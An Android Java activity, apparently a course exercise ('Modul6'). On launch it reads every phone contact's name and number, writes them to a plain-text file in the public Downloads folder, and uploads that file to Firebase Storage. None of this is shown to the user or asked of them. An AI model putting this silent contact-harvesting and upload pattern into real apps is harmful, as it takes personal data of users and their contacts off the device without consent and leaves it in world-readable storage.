package com.example.Modul6;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {
    private String fileName = "contacts.txt";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getContact();

        uploadFirebase();
    }

    private void uploadFirebase() {
        // Define the file name and path
        File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File file = new File(downloadsDirectory, fileName);

        // Create a FirebaseStorage object
        FirebaseStorage storage = FirebaseStorage.getInstance();

        // Get a reference to the Firebase Storage location where the file will be uploaded
        StorageReference storageRef = storage.getReference().child("contacts/" + fileName);

        // Create a file input stream to read the file data
        FileInputStream stream;
        try {
            stream = new FileInputStream(file);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            return;
        }

        // Upload the file to Firebase Storage
        UploadTask uploadTask = storageRef.putStream(stream);
        uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
            @Override
            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                // The file has been uploaded successfully
                Toast.makeText(MainActivity.this, "File uploaded to Firebase Storage", Toast.LENGTH_SHORT).show();
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                // There was an error uploading the file
                e.printStackTrace();
                Toast.makeText(MainActivity.this, "Failed to upload file to Firebase Storage", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void getContact() {
        // Define the file name and path
        File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        File file = new File(downloadsDirectory, fileName);

        // Get the content resolver
        ContentResolver resolver = getContentResolver();

        // Define the projection (fields to retrieve)
        String[] projection = new String[] {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };

        // Define the selection (filter)
        String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String[] selectionArgs = null;

        // Define the sort order
        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";

        // Query the contacts
        Cursor cursor = resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
        );


        // Open the file for writing
        try {
            FileWriter writer = new FileWriter(file);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the contact name and phone number
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                // Do something with the contact name and phone number
                Log.d("Contact", "Name: " + name + ", Phone: " + phone);
                // Write the contact name and phone number to the file
                writer.write(name + ", " + phone + "\n");
            }

            // Close the file writer
            writer.close();
            // Close the cursor
            cursor.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }


}